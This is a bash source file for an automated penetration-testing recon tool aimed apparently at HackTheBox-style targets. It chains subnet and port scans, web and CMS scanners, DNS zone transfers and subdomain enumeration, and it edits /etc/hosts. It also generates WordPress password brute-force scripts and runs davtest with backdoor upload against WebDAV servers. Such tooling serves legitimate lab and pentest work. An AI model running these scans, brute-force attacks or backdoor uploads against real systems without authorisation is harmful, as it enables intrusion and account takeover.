#!/usr/bin/env bash

banner1() {

    echo -e "\e[1;94m   _____________          ____    ________________                               \e[0m"
    echo -e "\e[1;94m  /___/___      \        /  / |  /___/__          \                   _____      \e[0m"
    echo -e "\e[1;94m      /  /   _   \______/__/  |______|__|_____ *   \_________________/__/  |___  \e[0m"
    echo -e "\e[1;94m   __/__/   /_\   \ |  |  \   __\/  _ \|  |       __/ __ \_/ ___\/  _ \|       | \e[0m"
    echo -e "\e[1;94m  |   |     ___    \|  |  /|  | (  |_| )  |    |   \  ___/\  \__(  |_| )   |   | \e[0m"
    echo -e "\e[1;94m  |___|____/\__\____|____/_|__|\_\____/|__|____|_  /\___  |\___  \____/|___|  /  \e[0m"
    echo -e "\e[1;94m                                             \___\/  \__\/  \___\/      \___\/   \e[0mv4.0"
    echo -e "\e[1;77m\e[45m         AUTO RECON by github.com/Knowledge-Wisdom-Understanding                        \e[0m"
    echo -e ""

}

DOPE='\e[1;32;92m[+]\e[0m'
NOTDOPE='\e[31m[+]\e[0m'
TEAL='\e[96m'
YELLOW='\e[93m'
END='\e[0m'

helpFunction() {
    echo -e "${DOPE} Usage: $0 [options...] <Target-IP>"
    echo " "
    echo " -h, --help         Show Usage and command arguments"
    echo " "
    echo " -t, --target       Scan a single host and show subnet hosts"
    echo " "
    echo " -a, --all          Scan The Entire Subnet!"
    echo " "
    echo " -H, --HTB          Scan Single Target ignore nmap subnet scan and check for .htb domains"
    echo " "
    echo " -f, --file         Scan all hosts from a file of IP Addresses separated 1 per line"
    echo " "
    echo " -v, --version      Show Version Information"
    if [ -n "$1" ]; then
        exit "$1"
    fi
}

exitFunction() {
    echo "ERROR: Unrecognized argument: $1" >&2
    helpFunction 1
}

# Error Cases
arg=("$@")
if [ -z $1 ]; then
    exitFunction
elif [ "$#" -lt 1 ]; then
    exitFunction
elif [ "$#" -gt 2 ]; then
    exitFunction
else
    rhost=${arg[1]}
fi

validate_IP() {
    if [[ $rhost =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        :
    else
        echo -e "\e[31m[+]\e[0m NOT A VALID IP ADDRESS"
        exit 1
    fi
}

# Function Definitions
getUpHosts() {
    baseip=$(echo $rhost | cut -d "." -f1-3)
    cidr_range=$(echo $baseip".0")
    echo -e "${DOPE} Scanning Subnet..."
    nmap -sn $cidr_range/24 -oG /tmp/live-hosts.txt >/dev/null
    cat /tmp/live-hosts.txt | grep "Up" | cut -d " " -f2 >live-hosts-ip.txt
    rm /tmp/live-hosts.txt
    echo -e "${DOPE} Live Hosts Recon On $cidr_range/24 Done!"
    cat live-hosts-ip.txt
}

Open_Ports_Scan() {
    echo -e "${DOPE} Scanning $rhost"
    create_nmap_dir() {
        if [ -d nmap ]; then
            :
        else
            mkdir -p nmap
        fi
    }
    create_nmap_dir
    create_wordlists_dir() {
        if [ -d wordlists ]; then
            :
        else
            mkdir -p wordlists
        fi
    }
    create_wordlists_dir
    nmap -vv -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/top-ports-$rhost $rhost
    grep -v "filtered" nmap/top-ports-$rhost.nmap | grep open | cut -d "/" -f 1 >top-open-ports.txt
    grep -v "filtered" nmap/top-ports-$rhost.nmap | grep open >top-open-services.txt
}

Enum_Web() {
    grep -v "ssl" top-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "(SSDP/UPnP)" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >httpports-$rhost.txt
    if [[ -s httpports-$rhost.txt ]]; then
        portfilename=httpports-$rhost.txt
        # echo $portfilename
        httpPortsLines=$(cat $portfilename)
        cwd=$(pwd)
        if grep -q "|_http-title: Did not follow redirect" nmap/http-vuln-enum-scan.nmap; then
            redirect_domain=$(grep -i "|_http-title: Did not follow redirect" nmap/http-vuln-enum-scan.nmap | cut -d " " -f 7 | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/")
            echo -e "${DOPE} Target is redirecting to domain: $redirect_domain"
            echo -e "${DOPE} Creating backup of /etc/hosts file in $cwd"
            cat /etc/hosts >etc-hosts-backup
            echo -e "${DOPE} Adding $redirect_domain to /etc/hosts file"
            if grep -q "$rhost" /etc/hosts; then
                :
            else
                sed -i $"3i$rhost\t$redirect_domain" /etc/hosts
            fi
            unset rhost
            rhost=$redirect_domain
        else
            :
        fi
        for port in $httpPortsLines; do
            wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            # wordlist2="/usr/share/seclists/Discovery/Web-Content/common.txt"
            echo -e "${DOPE} Running The Following Commands"
            # echo -e "${DOPE} gobuster dir -u http://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt -e -k | tee gobuster-$rhost-$port.txt"
            # echo -e "${DOPE} uniscan -u http://$rhost:$port/ -qweds"
            echo -e "${DOPE} whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log"
            whatweb -v -a 3 http://$rhost:$port | tee whatweb-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
            echo -e "${DOPE} Checking for Web Application Firewall... wafw00f http://$rhost:$port/"
            wafw00f http://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
            rm wafw00f-color-$rhost-$port.log
            echo -e "${DOPE} curl -sSik http://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null"
            curl -sSik http://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null
            # gobuster dir -u http://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt -e -k -o gobuster-$rhost-$port.txt 2>/dev/null
            echo -e "${DOPE} nikto -h http://$rhost:$port -output niktoscan-$rhost-$port.txt"
            nikto -ask=no -host http://$rhost:$port -output niktoscan-$rhost-$port.txt
            ####################################################################################
            mkdir -p eyewitness-report-"$rhost"-"$port" && cd /opt/EyeWitness
            echo http://"$rhost":"$port" >eyefile.txt
            echo -e "${DOPE} ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port"
            ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port
            cd - &>/dev/null
            ##################################################################################
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt,html,json,cnf,bak -x 403 --plain-text-report dirsearch-$rhost-$port.log"
            python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -t 80 -e php,asp,aspx,txt,html,json,cnf,bak,tar,gz -x 403 --plain-text-report dirsearch-$rhost-$port.log
            # uniscan -u http://$rhost:$port -qweds
            echo -e "${DOPE} Further Web enumeration Commands to Run: "
            echo -e "${DOPE} uniscan -u http://$rhost:$port -qweds"
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -w $wordlist -e php,asp,aspx,html,txt,js -x 403 -t 80 --plain-text-report dirsearch-dlistmedium-$rhost-$port.log"
            wp1=$(grep -i "WordPress" whatweb-$rhost-$port.log 2>/dev/null)
            wp2=$(grep -i "wp-" nmap/http-vuln-enum-scan.nmap)
            if [[ $wp1 ]] || [[ $wp2 ]]; then
                echo -e "${DOPE} Found WordPress! Running wpscan --no-update --url http://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee -a wpscan-$rhost-$port.log"
                wpscan --no-update --url http://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan-$rhost-$port.log
                # echo -e "${DOPE} 1 sleeping for 5 seconds to wait for wpscan process id :)"
                echo -e "${DOPE} Creating manual WordPress Brute-Force Script!"
                cat >wpBrute.sh <<EOF
#!/bin/bash

if [[ -n \$(grep -i "User(s) Identified" wpscan-$rhost-$port.log) ]]; then
    grep -w -A 100 "User(s)" wpscan-$rhost-$port.log | grep -w "[+]" | cut -d " " -f 2 | head -n -7 >wp-users.txt
    # create wordlist from web-page with cewl
    cewl http://$rhost:$port/ -m 3 -w cewl-list.txt
    sleep 10
    # add john rules to cewl wordlist
    echo -e "${DOPE} Adding John Rules to Cewl Wordlist!"
    john --rules --wordlist=cewl-list.txt --stdout >john-cool-list.txt
    # brute force again with wpscan
    sleep 3
    wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P cewl-list.txt threads 50 | tee wordpress-cewl-brute.txt
    sleep 5
    if grep -i "No Valid Passwords Found" wordpress-cewl-brute.txt 2>/dev/null; then
        if [ -s john-cool-list.txt ]; then
            wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P john-cool-list.txt threads 50 | tee wordpress-john-cewl-brute.txt
        else
            echo "john wordlist is empty :("
        fi
    fi
    sleep 5
    if grep -i "No Valid Passwords Found" wordpress-john-cewl-brute.txt 2>/dev/null; then
        wpscan --url http://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users.txt -P /usr/share/wordlists/fasttrack.txt threads 50 | tee wordpress-fasttrack-brute.txt
    fi
fi
EOF
            elif grep -i "Drupal" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u http://$rhost -t 32 | tee drupalscan-$rhost-$port.log"
                droopescan scan drupal -u http://$rhost:$port/ -t 32 | tee drupalscan-$rhost-$port.log
            elif grep -i "Joomla" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Joomla! Running joomscan --url http://$rhost/ -ec | tee joomlascan-$rhost-$port.log"
                joomscan --url http://$rhost:$port/ -ec | tee joomlascan-$rhost-$port.log
            elif [[ $(grep -i "WebDAV" whatweb-$rhost-$port.log 2>/dev/null) ]] || [[ $(grep -w "PUT" nmap/http-vuln-enum-scan.nmap) ]]; then
                echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url http://$rhost:$port/ | tee davtestscan-$rhost-$port.log"
                davtest -move -sendbd auto -url http://$rhost:$port/ | tee davtestscan-$rhost-$port.log
                echo -e "${DOPE} nmap -Pn -v -sV -p $port --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost"
                nmap -Pn -v -sV -p $port --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost
            elif grep -i "tomcat" top-open-services.txt 2>/dev/null; then
                grep -i "tomcat" top-open-services.txt | cut -d "/" -f 1 >current-tomcat-port.txt
                tcatportFile=current-tomcat-port.txt
                tcatport=$(cat $tcatportFile)
                gtcatport=$(echo $tcatport)
                if [[ $port -eq "$gtcatport" ]]; then
                    echo -e "${DOPE} Found TomCat! Running: gobuster dir -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt"
                    gobuster dir -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt
                    rm current-tomcat-port.txt
                else
                    :
                fi
            elif grep -i "magento" whatweb-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all http://$rhost/ | tee magescan-$rhost-$port.log"
                cd /opt/magescan
                bin/magescan scan:all http://$rhost:$port/ | tee magento-$rhost-$port.log
                cd - &>/dev/null
                echo -e "${DOPE} Consider crawling site: python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$port.log"
            else
                :
            fi
        done
        if [[ -n $redirect_domain ]]; then
            unset rhost
            rhost=${arg[1]}
        else
            :
        fi
    fi
}

Web_Vulns() {
    grep -v "ssl" top-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "UPnP" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >openports-web-$rhost.txt
    if [[ -s openports-web-$rhost.txt ]]; then
        echo -e "${DOPE} Running nmap http vuln-scan on all open http ports!"
        nmap -vv -Pn -sC -sV -p $(tr '\n' , <openports-web-$rhost.txt) -oA nmap/http-vuln-enum-scan $rhost
    fi
}

Web_Proxy_Scan() {
    grep -v "ssl" top-open-services.txt | grep -E "http-proxy|Squid" | cut -d "/" -f 1 >openports-webproxies-$rhost.txt
    proxyPort=$(grep -v "ssl" top-open-services.txt | grep -E "http-proxy|Squid" | cut -d "/" -f 1)
    if [[ -s openports-webproxies-$rhost.txt ]]; then
        echo -e "${DOPE} Found http-proxy at http://$rhost:$proxyPort"
        echo -e "${DOPE} Adding proxy port to /etc/proxychains.conf"
        if grep -i "$rhost" /etc/proxychains.conf; then
            :
        else
            echo "http $rhost $proxyPort" >>/etc/proxychains.conf
        fi
        echo -e "${DOPE} Running NMAP scan through http proxy"
        echo -e "${DOPE} proxychains nmap -vv -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/proxychainScanTopPorts 127.0.0.1"
        proxychains nmap -vv -sT -Pn -sV -T3 --max-retries 1 --max-scan-delay 20 --top-ports 10000 -oA nmap/proxychainScanTopPorts 127.0.0.1
        grep -v "filtered" nmap/proxychainScanTopPorts.nmap | grep open | cut -d "/" -f 1 >top-proxy-open-ports.txt
        grep -v "filtered" nmap/proxychainScanTopPorts.nmap | grep open >top-proxy-open-services.txt
        echo -e "${DOPE} proxychains nmap -vv -sT -Pn -sC -sV -p $(tr '\n' , <top-proxy-open-ports.txt) -oA nmap/proxychainServiceScan 127.0.0.1"
        proxychains nmap -vv -sT -Pn -sC -sV -p $(tr '\n' , <top-proxy-open-ports.txt) -oA nmap/proxychainServiceScan 127.0.0.1
        grep -v "ssl" top-proxy-open-services.txt | grep -v "proxy" | grep -v "RPC" | grep -v "(SSDP/UPnP)" | grep -E "http|BaseHTTPServer" | cut -d "/" -f 1 >http-proxy-ports-$rhost.txt
        proxyPortfilename=http-proxy-ports-$rhost.txt
        httpProxyPortsLines=$(cat $proxyPortfilename)
        if [[ -s http-proxy-ports-$rhost.txt ]]; then
            for webPort in $httpProxyPortsLines; do
                echo -e "${DOPE} whatweb -v -a 3 --proxy $rhost:$proxyPort http://127.0.0.1:$webPort/"
                whatweb -v -a 3 --proxy $rhost:$proxyPort http://127.0.0.1:$webPort/ | tee whatweb-color-proxy-$rhost-$webPort.log
                sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-proxy-$rhost-$webPort.log >whatweb-proxy-$rhost-$webPort.log && rm whatweb-color-proxy-$rhost-$webPort.log
                echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt,json,cnf,bak,js -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ --plain-text-report proxy-crawl-$rhost-$webPort-$proxyPort.log"
                python3 /opt/dirsearch/dirsearch.py -e php,asp,aspx,html,txt,json,cnf,bak,js -x 403 -t 50 --proxy $rhost:$proxyPort -u http://127.0.0.1:$webPort/ -w /usr/share/wordlists/dirb/big.txt --plain-text-report proxy-big-crawl-$rhost-$webPort-$proxyPort.log
                echo -e "${DOPE} nikto -ask=no -host http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$rhost-$webPort-scan.txt"
                nikto -ask=no -host http://127.0.0.1:$webPort/ -useproxy http://$rhost:$proxyPort/ -output nikto-$rhost-$webPort-scan.txt
                wp3=$(grep -i "wordpress" proxy-big-crawl-$rhost-$webPort-$proxyPort.log)
                wp4=$(grep -i "wordpress" whatweb-proxy-$rhost-$webPort.log)
                wordpressURL=$(grep -i "wordpress" proxy-big-crawl-$rhost-$webPort-$proxyPort.log | awk '{print $3}' | head -n 1)
                if [[ $wp3 ]] || [[ $wp4 ]]; then
                    echo -e "${DOPE} Found WordPress!"
                    if [[ -n $wordpressURL ]]; then
                        echo -e "${DOPE} wpscan --no-update --url $wordpressURL --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort"
                        wpscan --no-update --url $wordpressURL --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort | tee wpscan-$rhost-$webPort-$proxyPort.log
                    else
                        echo -e "${DOPE} wpscan --no-update --url http://127.0.0.1:$webPort/ --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort"
                        wpscan --no-update --url http://127.0.0.1:$webPort/ --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive --proxy http://$rhost:$proxyPort | tee wpscan-$rhost-$webPort-$proxyPort.log
                    fi
                elif grep -i "Drupal" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u http://127.0.0.1:$webPort/ -t 32 | tee drupalscan-$rhost-$webPort.log"
                    proxychains droopescan scan drupal -u http://127.0.0.1:$webPort/ -t 32 | tee drupalscan-$rhost-$webPort.log
                elif grep -i "Joomla" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Joomla! Running joomscan --url http://$rhost/ -ec | tee joomlascan-$rhost-$webPort.log"
                    joomscan --url http://127.0.0.1:$webPort/ -ec --proxy http://$rhost:$proxyPort | tee joomlascan-$rhost-$webPort.log
                elif [[ $(grep -i "WebDAV" whatweb-proxy-$rhost-$webPort.log 2>/dev/null) ]] || [[ $(grep -w "PUT" nmap/proxychainServiceScan.nmap) ]]; then
                    echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url http://$rhost:$webPort/ | tee davtestscan-$rhost-$webPort.log"
                    proxychains davtest -move -sendbd auto -url http://127.0.0.1:$webPort/ | tee davtestscan-$rhost-$webPort.log
                    echo -e "${DOPE} nmap -Pn -v -sV -p $webPort --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost"
                    proxychains nmap -sT -Pn -v -sV -p $webPort --script=http-iis-webdav-vuln.nse -oA nmap/webdav $rhost
                elif grep -i "magento" whatweb-proxy-$rhost-$webPort.log 2>/dev/null; then
                    echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all http://$rhost/ | tee magescan-$rhost-$webPort.log"
                    cd /opt/magescan
                    proxychains bin/magescan scan:all -n http://127.0.0.1:$webPort/ | tee magento-$rhost-$webPort.log
                    cd - &>/dev/null
                    echo -e "${DOPE} Consider crawling site: python3 /opt/dirsearch/dirsearch.py -u http://$rhost:$webPort -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$webPort.log"
                else
                    :
                fi
            done
            cat proxy-big-crawl-*.log | grep -Ev "500|403|400|401|503" | awk '{print $3}' | sort -u >snProxyURLs.txt
            urlProxyPorts=$(cat http-proxy-ports-$rhost.txt | tr '\n' ',')
            formattedUrlProxyPorts=$(echo "${urlProxyPorts::-1}")
            cat snProxyURLs.txt | aquatone -ports $formattedUrlProxyPorts -proxy http://$rhost:$proxyPort -out proxy_aquatone
            rm snProxyURLs.txt
        fi
    fi
}

dns_enum() {
    cwd=$(pwd)
    dig -x $rhost | dig-$rhost-output.txt
    cat sslscan-$rhost-$port.log | grep "Subject" | awk '{print $2}' >domain.txt
    domainName=$(grep "Subject" sslscan-$rhost-$port.log | awk '{print $2}')
    wildcards=('*' '?' '|')
    for wildcard in "${wildcards[@]}"; do
        if [[ $domainName == *"${wildcard}"* ]]; then
            domainNoWildcard=$(echo "${domainName#'*.'}")
            echo -e "${DOPE} Removing wildcard from $domainName .. Setting domain to $domainNoWildcard"
            unset domainName
            domainName="$domainNoWildcard"
        else
            :
        fi
    done
    if [[ -s domain.txt ]] && [[ -n $domainName ]] && [[ $domainName != "localhost" ]]; then
        set -- $domainName
        echo -e "${DOPE} Target has domain: $domainName"
        echo -e "${DOPE} Creating backup of /etc/hosts file in $cwd"
        cat /etc/hosts >etc-hosts-backup2.txt
        if grep -q $"$rhost\t$domainName" /etc/hosts; then
            :
        elif [[ $rhost == 127.0.0.1 ]]; then
            :
        else
            echo -e "${DOPE} Adding $domainName to /etc/hosts file"
            sed -i $"3i$rhost\t$domainName" /etc/hosts
        fi
        echo -e "${DOPE} Checking for Zone Transfer on $rhost:$port $domainName"
        dig axfr @$rhost $domainName | tee zone-transfer-$rhost-$port-$domainName.txt
        if grep -q "$domainName" zone-transfer-$rhost-$port-$domainName.txt; then
            grep -v ";" zone-transfer-$rhost-$port-$domainName.txt | grep -v -e '^[[:space:]]*$' >filtered-zone-transfer-$rhost-$port-$domainName.txt
            allDomains=$(cat filtered-zone-transfer-$rhost-$port-$domainName.txt | awk '{print $1}')
            domainDot=$(echo $domainName".")
            for dmain in $allDomains; do
                if [[ $domainDot == "$dmain" ]]; then
                    :
                else
                    dmainMinusDot=$(echo "${dmain:0:-1}")
                    if grep -q "$dmainMinusDot" /etc/hosts; then
                        :
                    elif [[ $rhost == 127.0.0.1 ]]; then
                        :
                    else
                        sed -i "/$domainName/ s/$/ $dmainMinusDot/" /etc/hosts
                    fi
                fi
            done
            echo -e "${YELLOW}#################################################################################################### ${END}"
            cat /etc/hosts

        fi
        curl -sSik https://$rhost:$port -m 10 -o homepage-source.html &>/dev/null
        sed -n 's/.*href="\([^"]*\).*/\1/p' homepage-source.html >links.txt
        cat links.txt | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" >urls.txt
        urlsList=urls.txt
        loopUrlsList=$(cat $urlsList)
        if [[ -s urls.txt ]]; then
            for url in $loopUrlsList; do
                if [[ $url == *".htb" ]]; then
                    echo "${DOPE} found .htb domain: $url "
                    if grep -q $"$rhost\t$domainName" /etc/hosts; then
                        if grep -q "$url" /etc/hosts; then
                            :
                        else
                            echo "${DOPE} Adding $url to /etc/hosts file"
                            sed -i "/$domainName/ s/$/ $url/" /etc/hosts
                        fi
                    else
                        :
                    fi
                else
                    :
                fi
            done
            echo -e "${YELLOW}#################################################################################################### ${END}"
            cat /etc/hosts
        fi
        echo -e "${DOPE} Running Dnsrecon ${DOPE} dnsrecon -d $domainName | tee dnsrecon-$rhost-$domainName.log"
        dnsrecon -d $domainName | tee dnsrecon-$rhost-$domainName.log
        reconDir=$(echo $cwd)
        echo -e "${DOPE} Running sublist3r ${DOPE} sublist3r.py -d $domainName -o $reconDir/subdomains-$rhost-$port-$domainName.log"
        cd /opt/Sublist3r && python3 sublist3r.py -d $domainName -o $reconDir/subdomains-$rhost-$port-$domainName.log
        cd - &>/dev/null
        echo -e "${DOPE} Running subfinder ${DOPE} subfinder -d $domainName -o "$domainName"-subfinder.log"
        subfinder -d $domainName -o "$domainName"-subfinder.log
        echo -e "${DOPE} Running gobuster ${DOPE} gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$domainName.log"
        gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$domainName.log
    fi
    if [[ -n "$domainName" ]] && [[ $domainName != "localhost" ]]; then
        unset rhost
        rhost=$domainName
    else
        :
    fi
}

Enum_Web_SSL() {
    grep -E 'https|ssl/http|ssl/unknown' top-open-services.txt | cut -d "/" -f 1 >openportsSSL-$rhost.txt
    if [[ -s openportsSSL-$rhost.txt ]]; then
        portfilenameSSL=openportsSSL-$rhost.txt
        # echo $portfilenameSSL
        httpPortsLinesSSL=$(cat $portfilenameSSL)
        cwd=$(pwd)
        for port in $httpPortsLinesSSL; do
            set -- $port
            wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
            wordlist2="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            echo -e "${DOPE} Running The Following Commands"
            echo -e "${DOPE} sslscan https://$rhost:$port | tee sslscan-$rhost-$port.log"
            sslscan https://$rhost:$port | tee sslscan-color-$rhost-$port.log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" sslscan-color-$rhost-$port.log >sslscan-$rhost-$port.log
            rm sslscan-color-$rhost-$port.log
            dns_enum
            echo -e "${DOPE} whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log"
            whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-ssl-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
            echo -e "${DOPE} Checking for Web Application Firewall... wafw00f https://$rhost:$port/"
            wafw00f https://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
            rm wafw00f-color-$rhost-$port.log
            echo -e "${DOPE} curl -sSik https://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt"
            curl -sSik https://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null
            ############## EYE-WITNESS ##########################################
            mkdir -p eyewitness-report-"$rhost"-"$port" && cd /opt/EyeWitness
            echo https://"$rhost":"$port" >eyefile.txt
            echo -e "${DOPE} ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port"
            ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port
            cd - &>/dev/null
            echo -e "${DOPE} gobuster dir -u https://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt"
            gobuster dir -u https://$rhost:$port -w $wordlist -l -t 50 -x .html,.php,.asp,.aspx,.txt,.js -e -k -o gobuster-$rhost-$port.txt
            echo -e "${DOPE} nikto -h https://$rhost:$port -output niktoscan-$rhost-$port.txt"
            nikto -ask=no -host https://$rhost:$port -ssl -output niktoscan-$rhost-$port.txt
            # uniscan -u https://$rhost:$port -qweds
            echo -e "${DOPE} Further Web enumeration Commands to Run: "
            echo -e "${DOPE} uniscan -u https://$rhost:$port -qweds"
            echo -e "${DOPE} gobuster dir -u https://$rhost:$port -w $wordlist2 -l -t 80 -x .html,.php,.asp,.aspx,.txt -e -k | tee gobuster-$rhost-$port.txt"

            if [ $(grep -i "WordPress" whatweb-ssl-$rhost-$port.log 2>/dev/null) ]; then
                echo -e "${DOPE} Found WordPress! Running wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan2-$rhost-$port.log"
                wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan2-$rhost-$port.log
                sleep 1
                echo -e "${DOPE} Creating manual brute force script!"
                cat >wordpressBrute.sh <<EOF
#!/bin/bash

if [[ -n \$(grep -i "User(s) Identified" wpscan2-$rhost-$port.log) ]]; then
    grep -w -A 100 "User(s)" wpscan2-$rhost-$port.log | grep -w "[+]" | cut -d " " -f 2 | head -n -7 >wp-users2.txt
    # create wordlist from web-page with cewl
    cewl https://$rhost:$port/ -m 3 -w cewl-list2.txt
    sleep 10
    # add john rules to cewl wordlist
    echo "Adding John Rules to Cewl Wordlist!"
    john --rules --wordlist=cewl-list2.txt --stdout >john-cool-list2.txt
    sleep 3
    # brute force again with wpscan
    wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P cewl-list.txt threads 50 | tee wordpress-cewl-brute2.txt
    sleep 1
    if grep -i "No Valid Passwords Found" wordpress-cewl-brute2.txt; then
        if [ -s john-cool-list2.txt ]; then
            wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P john-cool-list2.txt threads 50 | tee wordpress-john-cewl-brute2.txt
        else
            echo "John wordlist is empty :("
        fi
        # if password not found then run it again with fasttrack.txt
        sleep 1
        if grep -i "No Valid Passwords Found" wordpress-john-cewl-brute2.txt; then
            wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P /usr/share/wordlists/fasttrack.txt threads 50 | tee wordpress-fasttrack-brute2.txt
        fi
    fi
fi
EOF
            elif grep -i "Drupal" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u https://$rhost -t 32 | tee drupalscan-$rhost-$port.log"
                droopescan scan drupal -u https://$rhost:$port/ -t 32 | tee -a drupalscan.log
            elif grep -i "Joomla" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Joomla! Running joomscan --url https://$rhost/ -ec | tee joomlascan-$rhost-$port.log"
                joomscan --url https://$rhost:$port/ -ec | tee -a joomlascan-$rhost-$port.log
            elif grep -i "WebDAV" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url https://$rhost:$port/ | tee davtestscan-$rhost-$port.log"
